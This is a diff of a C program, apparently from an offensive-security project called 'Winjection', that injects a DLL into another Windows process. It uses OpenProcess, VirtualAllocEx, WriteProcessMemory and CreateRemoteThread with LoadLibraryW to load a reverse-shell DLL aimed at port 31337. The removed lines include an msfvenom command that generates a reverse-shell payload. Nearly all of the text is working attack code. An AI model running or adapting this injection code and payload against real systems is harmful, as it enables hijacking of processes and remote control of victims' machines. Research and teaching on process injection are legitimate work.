@@ -15,10 +15,8 @@ int main(int argc, char *argv[]) {
     DWORD pid;
 
     // Reverse shell to 127.0.0.1:31337
-    // msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f dll -b \x00\x0a\x0d -o reverse.dll
+    // Written from scratch, check the Payloads directory of Winjection
     // Can test with rundll32.exe reverse.dll,DllMain
-    //wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\reverse.dll");
-    //wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\test.dll");
     wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\winjection-reverseshelldll.dll");
 
     // Get a PID, error out if improper input for PID
@@ -27,26 +25,15 @@ int main(int argc, char *argv[]) {
         return -1;
     }
 
-    // For debug: inject into myself
-    //pid = GetCurrentProcessId();
-
     // Potentially won't work if cannot access process, can't allocate space in it, etc. (No error checking)
     processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    printf("err: %d\n", GetLastError());
     remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-    printf("err: %d\n", GetLastError());
     WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
-    printf("err: %d\n", GetLastError());
     PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
-    printf("err: %d\n", GetLastError());
     remoteThread = CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);
-    printf("err: %d\n", GetLastError());
     WaitForSingleObject(remoteThread, INFINITE);
-    printf("err: %d\n", GetLastError());
     VirtualFreeEx(processHandle, remoteBuffer, NULL, MEM_RELEASE);
-    printf("err: %d\n", GetLastError());
     CloseHandle(processHandle);
-    printf("err: %d\n", GetLastError());
     
     return 0;
 }
